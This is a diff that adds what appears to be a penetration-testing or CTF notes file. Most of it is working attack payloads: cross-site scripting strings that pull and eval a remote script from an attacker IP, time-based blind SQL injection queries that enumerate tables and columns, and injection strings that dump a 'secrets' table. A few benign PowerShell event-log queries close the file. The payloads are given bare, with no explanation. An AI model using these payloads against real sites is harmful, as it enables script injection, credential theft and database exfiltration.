@@ -1,0 +1,21 @@
+<script src=http://10.10.16.24/script.js></script>
+'><script src=http://10.10.16.24/script.js></script>
+"><script src=http://10.10.16.24/script.js></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.24/script.js\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.16.24/script.js");a.send();</script>
+<script>$.getScript("http://10.10.16.24/script.js")</script>
+
+
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--
+
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
+
+',nickName=(SELECT group_concat(secret) from secrets),email='
+
+
+Get-WinEvent -LogName Application -FilterXPath '*/System/TimeCreated[@SystemTime]="2020-12-15T01:09:08.940277500Z"'
+Get-WinEvent -LogName Application -FilterXPath '*/System/Provider[@Name="WLMS"] and */System/TimeCreated[@SystemTime="2020-12-15T01:09:08.940277500Z"]'
+
+Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name="TargetUserName"]="Sam" and */System/EventID=4720'
